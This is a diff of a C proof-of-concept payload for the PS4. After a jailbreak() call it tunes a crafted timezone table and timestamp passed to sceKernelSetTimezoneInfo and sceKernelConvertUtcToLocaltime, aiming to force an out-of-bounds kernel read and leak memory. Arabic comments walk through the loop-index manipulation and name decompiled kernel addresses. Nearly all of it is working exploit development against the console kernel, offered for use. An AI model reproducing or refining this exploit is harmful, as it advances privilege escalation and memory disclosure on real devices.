@@ -115,6 +115,7 @@ int _main(struct thread *td) {
 }
 */
 
+
 #include "ps4.h"
 
 int _main(struct thread *td) {
@@ -126,34 +127,32 @@ int _main(struct thread *td) {
     jailbreak();
     initSysUtil();
 
-    printf_debug("=== timezone infoleak PoC ===\n");
+    printf_debug("=== timezone v2 ===\n");
 
     static uint8_t data[512 * 16];
     memset(data, 0, sizeof(data));
 
-    // timestamps تصاعدية
     for (int i = 0; i < 512; i++) {
         *(long*)(data + i * 16)      = (long)i * 0x1000;
         *(int*)(data  + i * 16 + 8)  = 0x41410000 + i;
-        *(int*)(data  + i * 16 + 12) = 0x42420000 + i;
+        // نضع dst = 0 لكل entries إلا آخر واحدة
+        // هذا يجبر الـ loop الداخلي يكمل
+        *(int*)(data  + i * 16 + 12) = 0;
     }
+
+    // آخر entry dst = 1 لإيقاف الـ loop
+    *(int*)(data + 511 * 16 + 12) = 1;
 
     int r = sceKernelSetTimezoneInfo(data, 512);
     printf_debug("set_timezone r=%d\n", r);
 
-    if (r != 0) {
-        printf_debug("[-] failed\n");
-        return 0;
-    }
-
-    // timestamp أكبر من آخر entry بقليل
-    // entry[511].timestamp = 511 * 0x1000 = 0x1FF000
-    // نستخدم 0x1FF001 لإجبار index = 512
-    long timestamp = 0x1FF001;
-
     long out_local = 0;
     long out_tz[2] = {0, 0};
     int  out_dst   = 0;
+
+    // timestamp بين entry[510] و entry[511]
+    // لإجبار uVar6 = 510 ثم الـ loop يصل لـ 512
+    long timestamp = 510 * 0x1000 + 1;
 
     r = sceKernelConvertUtcToLocaltime(
         timestamp,
@@ -168,17 +167,9 @@ int _main(struct thread *td) {
     printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
     printf_debug("out_dst  =0x%x\n",  out_dst);
 
-    // لو out_tz[0] يحتوي على قيمة من DAT_ffffffff844d1790:
-    // = count = 512 = 0x200
-    printf_debug("\nExpected if OOB:\n");
-    printf_debug("DAT_ffffffff844d1790 = 0x200 (count)\n");
-    printf_debug("DAT_ffffffff844d1798 = ktimer data\n");
-
-    // فحص infoleak
-    if (out_tz[0] != 0 && 
-        (out_tz[0] & 0xffffffff00000000) != 0x4242000000000000) {
-        printf_debug("[+] POTENTIAL INFOLEAK!\n");
-        printf_debug("leaked = 0x%lx\n", out_tz[0]);
+    // لو out_dst يحتوي على قيمة من خارج الـ buffer:
+    if (out_dst != 0 && out_dst != 1) {
+        printf_debug("[+] OOB READ - leaked=0x%x\n", out_dst);
     }
 
     return 0;
